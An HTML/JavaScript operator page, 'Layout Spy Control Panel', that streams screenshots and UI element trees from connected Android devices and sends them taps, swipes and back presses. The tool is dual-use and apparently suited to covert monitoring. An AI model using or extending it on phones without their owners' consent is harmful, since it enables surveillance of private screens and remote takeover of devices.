<!DOCTYPE html>
<html>
<head>
    <title>üîç Layout Spy Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,20,40,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00aaff;
        }
        .device { padding: 15px; margin: 10px 0; background: rgba(255,255,255,0.1); 
            cursor: pointer; border-radius: 10px; transition: all 0.3s; 
            border: 1px solid rgba(0,170,255,0.3); }
        .device:hover { background: rgba(0,170,255,0.2); transform: translateX(5px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
            color: #000; box-shadow: 0 0 20px rgba(0,255,136,0.5); }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            width: 420px; height: 850px; margin: 20px auto; 
            background: linear-gradient(145deg, #1a1a2e, #16213e); 
            border: 30px solid #2a2a4a; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6), inset 0 0 20px rgba(255,255,255,0.05);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 25px;
            position: relative; overflow: hidden;
        }
        .layout-element {
            position: absolute; border-radius: 4px; cursor: pointer;
            transition: all 0.2s; font-size: 11px; padding: 2px 4px;
            backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.3);
        }
        .clickable { background: rgba(0,255,136,0.3) !important; border-color: #00ff88 !important; }
        .clickable:hover { background: rgba(0,255,136,0.6) !important; transform: scale(1.05); }
        .text-element { background: rgba(0,123,255,0.4); color: white; }
        .button-element { background: rgba(255,100,100,0.5); }
        
        #fps-counter, #status { 
            position: fixed; top: 10px; right: 10px; 
            background: rgba(0,20,40,0.95); padding: 15px; 
            border-radius: 10px; font-size: 13px; border: 1px solid #00aaff;
        }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 15px 35px; margin: 0 10px; 
            background: linear-gradient(45deg, #00aaff, #007acc); 
            color: white; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(0,170,255,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,170,255,0.6); }
        
        #element-info { 
            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 10px; 
            max-width: 400px; display: none; border: 1px solid #00ff88;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üîç Devices (Layout Mode)</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Elements: <span id="elementCount">0</span> | Device: <span id="selectedDevice">-</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="background-screen" style="position:absolute; top:0; left:0; width:100%; height:100%;"></canvas>
        <div id="screen"></div>
    </div>

    <div id="element-info">
        <h4 id="element-title">-</h4>
        <p id="element-details"></p>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="clearElements()">üóëÔ∏è Clear</button>
        <button onclick="toggleLayoutOnly()">üëÅÔ∏è Layout Only</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let showScreenshot = true;
        let elements = [];
        let hoveredElement = null;

        const canvas = document.getElementById('background-screen');
        const ctx = canvas.getContext('2d');
        const screenDiv = document.getElementById('screen');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const elementCount = document.getElementById('elementCount');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // üî• LAYOUT RENDERING ENGINE
        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            // 1. Screenshot background (optional)
            if (data.screenshot && showScreenshot) {
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                };
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            }
            
            // 2. üî• LAYOUT ELEMENTS (MAIN FEATURE)
            elements = data.layout || [];
            renderLayout();
            
            // FPS
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                fpsDisplay.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                elementCount.textContent = elements.length;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderLayout() {
            screenDiv.innerHTML = '';
            
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            
            elements.forEach((el, index) => {
                const bounds = el.bounds;
                const x = (bounds.left / scaleX);
                const y = (bounds.top / scaleY);
                const w = (bounds.width / scaleX);
                const h = (bounds.height / scaleY);
                
                const elementDiv = document.createElement('div');
                elementDiv.className = `layout-element ${el.clickable ? 'clickable' : ''} 
                    ${el.className?.includes('Button') ? 'button-element' : ''} 
                    ${el.text ? 'text-element' : ''}`;
                elementDiv.style.left = x + 'px';
                elementDiv.style.top = y + 'px';
                elementDiv.style.width = w + 'px';
                elementDiv.style.height = h + 'px';
                
                // Tooltip text
                const text = el.text || el.contentDesc || el.resourceId || 'Element';
                elementDiv.title = `${text}\n(${Math.round(bounds.centerX)}, ${Math.round(bounds.centerY)})`;
                
                // Click handler
                elementDiv.onclick = (e) => {
                    e.stopPropagation();
                    sendTap(bounds.centerX, bounds.centerY);
                    showElementInfo(el, bounds.centerX, bounds.centerY);
                };
                
                // Hover effects
                elementDiv.onmouseenter = () => highlightElement(elementDiv, el);
                elementDiv.onmouseleave = () => unhighlightElement(elementDiv);
                
                screenDiv.appendChild(elementDiv);
            });
        }

        function highlightElement(elDiv, elData) {
            hoveredElement = elDiv;
            elDiv.style.boxShadow = '0 0 20px rgba(0,255,255,0.8)';
            elDiv.style.zIndex = '1000';
            showElementInfo(elData);
        }

        function unhighlightElement(elDiv) {
            if (hoveredElement === elDiv) {
                elDiv.style.boxShadow = '';
                elDiv.style.zIndex = '';
                hideElementInfo();
            }
        }

        function showElementInfo(el, x = 0, y = 0) {
            document.getElementById('element-title').textContent = el.text || el.contentDesc || 'Element';
            document.getElementById('element-details').innerHTML = `
                Class: ${el.className || 'N/A'}<br>
                ID: ${el.resourceId || 'N/A'}<br>
                Size: ${el.bounds.width}x${el.bounds.height}<br>
                Clickable: ${el.clickable ? '‚úÖ YES' : '‚ùå NO'}<br>
                Pos: (${Math.round(x)}, ${Math.round(y)})
            `;
            document.getElementById('element-info').style.display = 'block';
        }

        function hideElementInfo() {
            document.getElementById('element-info').style.display = 'none';
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small>
                        <span style="float:right">${info.status === 'layout-active' ? 'üîç LAYOUT' : 'üì± LIVE'}</span>
                        ${info.connected ? 'üü¢' : 'üî¥'}
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        // Touch/Mouse on phone frame (direct coordinates)
        let startX = 0, startY = 0, dragging = false;
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (dragging && currentDevice) {
                    const coords = getScaledCoords(
                        e.changedTouches?.[0]?.clientX || e.clientX,
                        e.changedTouches?.[0]?.clientY || e.clientY
                    );
                    sendTap(coords.x, coords.y);
                }
                dragging = false;
            });
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'tap', x, y 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function clearElements() {
            screenDiv.innerHTML = '';
            elements = [];
        }

        function toggleLayoutOnly() {
            showScreenshot = !showScreenshot;
            canvas.style.opacity = showScreenshot ? '1' : '0.3';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        fetch('/devices').then(r => r.json()).then(updateDeviceList);
        phoneFrame.ondblclick = sendBack;
    </script>
</body>
</html>
